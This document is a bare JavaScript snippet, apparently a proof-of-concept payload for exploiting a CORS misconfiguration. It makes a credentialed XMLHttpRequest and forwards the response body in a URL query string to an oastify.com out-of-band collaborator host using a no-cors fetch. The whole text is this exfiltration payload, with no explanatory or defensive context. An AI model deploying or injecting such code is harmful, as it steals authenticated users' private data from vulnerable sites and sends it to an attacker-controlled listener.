var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET', 'https://usqdbirh5v8fqtbtjw5oyywvqmwmkg85.oastify.com/zzz', true);
req.withCredentials = true;
req.send();

function reqListener() {
    fetch('https://usqdbirh5v8fqtbtjw5oyywvqmwmkg85.oastify.com/?x=' + this.responseText, {
        mode: 'no-cors'
    });
}
